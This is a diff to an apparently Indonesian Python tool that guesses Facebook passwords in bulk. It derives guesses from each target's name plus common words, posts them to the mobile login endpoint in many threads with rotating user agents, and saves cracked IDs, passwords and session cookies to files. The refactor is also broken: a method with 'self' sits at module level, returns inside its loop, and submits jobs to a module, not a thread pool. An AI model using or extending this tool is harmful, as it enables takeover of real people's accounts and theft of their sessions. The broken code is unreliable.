@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+from multiprocessing import pool
 import requests,json,os,sys,random,datetime,time,re
 from concurrent.futures import ThreadPoolExecutor
 from rich.panel import Panel
@@ -353,49 +354,55 @@ class crack:
                     oprek.append('ya')
                 else:
                     oprek.append('no')
-        passwrd()
+        generate_password()
 ### CRACK ###
-def passwrd():
-        ler = '# CRACK DIMULAI'
-        sol().print(mark(ler, style='cyan'))
-        krek = 'Hasil Ok  Disimpan Ke : OK/%s\nHasil Cp Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
-        cetak(nel(krek, title='CRACK'))
-        with tred(max_workers=30) as pool:
-            for yuzong in id2:
-                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-                frs = nmf.split(' ')[0]
-                pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','malang','bismillah123','123455']
-                if len(nmf)<6:
-                    if len(frs)<3:
+def __init__(self) -> None:
+        self.checkpoint, self.looping, self.success = [], 0, []
+        pass
+    ### GENERATE PASSWORD ###
+def generate_password(self, name):
+    self.password = []
+    for nama in name.split(' '):
+        if len(name) <= 5:
+            if len(nama) < 3:
+                continue
+            else:
+                self.password.append(nama + '123')
+                self.password.append(nama + '1234')
+                self.password.append(nama + '12345')
+                self.password.append(nama + '123456')
+        else:
+            if len(nama) < 3:
+                self.password.append(name)
+            else:
+                self.password.append(name)
+                self.password.append(nama + '123')
+                self.password.append(nama + '1234')
+                self.password.append(nama + '12345')
+                self.password.append(nama + '123456')
+                self.password_ = []
+                for z in self.password:
+                    if str(z) in str(self.password_):
                         continue
                     else:
-                        pwv.append(frs+'123')
-                        pwv.append(frs+'1234')
-                        pwv.append(frs+'12345')
-                else:
-                    if len(frs)<3:
-                        pwv.append(nmf)
-                    else:
-                        pwv.append(nmf)
-                        pwv.append(frs+'123')
-                        pwv.append(frs+'1234')
-                        pwv.append(frs+'12345')
-                        if 'mobile' in method:
-                            pool.submit(crac,idf,pwv)
-                        elif 'api' in method:
-                            pool.submit(crack2,idf,pwv)
-                        elif 'free' in method:
-                            pool.submit(crack3,idf,pwv)
-                        else:
-                            pool.submit(crac,idf,pwv)
-                            print('')
-                            tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
-                            sol().print(mark(tanya, style='cyan'))
-                            woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
-                            if woi in ['y','Y']:
-                                cek_opsi()
-                            else:
-                                exit()
+                        self.password_.append(z)
+                        return self.password_
+    if 'mobile' in method:
+        pool.submit(crac,nama,self)
+    elif 'api' in method:
+        pool.submit(crack2,nama,self)
+    elif 'free' in method:
+        pool.submit(crack3,nama,self)
+    else:
+        pool.submit(crac,nama,self)
+    print('')
+    tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
+    sol().print(mark(tanya, style='cyan'))
+    woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
+    if woi in ['y','Y']:
+        cek_opsi()
+    else:
+        exit()
                                 
 def open_list(self):
         try:
@@ -404,13 +411,13 @@ def open_list(self):
             with ThreadPoolExecutor(max_workers=35) as (V):
                 for z in Dump:
                     self.email, self.nama = z.split('|')[0], z.split('|')[1]
-                    self.passwrd = self.passwrd(self.nama)
-                    V.submit(self.main, Dump, self.email, self.passwrd)
+                    self.password = self.passwrd(self.nama)
+                    V.submit(self.main, Dump, self.email, self.password)
             Console().print("\r[bold white][[bold green]Selesai[bold white]]                           ");exit()
         except:exit()
 
     
-def crac(idf,pwv):
+def crac(self, total, email, password):
     global loop,ok,cp
     bi = random.choice([u,k,kk,b,h,hh])
     pers = loop*100/len(id2)
@@ -419,25 +426,25 @@ def crac(idf,pwv):
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
     ses = requests.Session()
-    for pw in pwv:
+    for pw in password:
         try:
             tix = time.time()
             ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
             p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
-            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
+            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":email,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
             ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 if 'ya' in oprek:
-                    akun.append(idf+'|'+pw)
-                    ceker(idf,pw)
+                    akun.append(email+'|'+pw)
+                    ceker(email,pw)
                 else:
                     print('\n')
-                    statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
+                    statuscp = f'[•] ID       : {email} [•] PASSWORD : {pw}'
                     statuscp1 = nel(statuscp, style='red')
                     cetak(nel(statuscp1, title='SESI'))
-                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-                    akun.append(idf+'|'+pw)
+                    open('CP/'+cpc,'a').write(email+'|'+pw+'\n')
+                    akun.append(email+'|'+pw)
                     cp+=1
                     break
             elif "c_user" in ses.cookies.get_dict().keys():
@@ -446,9 +453,9 @@ def crac(idf,pwv):
                     ok+=1
                     coki=po.cookies.get_dict()
                     kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+                    open('OK/'+okc,'a').write(email+'|'+pw+'|'+kuki+'\n')
                     print('\n')
-                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
+                    statusok = f'[•] ID       : {email}\n[•] PASSWORD : {pw}'
                     statusok1 = nel(statusok, style='green')
                     cetak(nel(statusok1, title=' NO SESI'))
                     break
@@ -456,8 +463,8 @@ def crac(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-                user=idf
+                open('OK/'+okc,'a').write(email+'|'+pw+'|'+kuki+'\n')
+                user=email
                 infoakun = ""
                 session = requests.Session()
                 get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
@@ -511,7 +518,7 @@ def crac(idf,pwv):
                                     hit2+=1
                                 else:pass
                                 print('\n')
-                                statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
+                                statusok = f'[•] ID       : {email}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
                                 statusok1 = nel(statusok, style='green')
                                 cetak(nel(statusok1, title='OK'))
                                 break
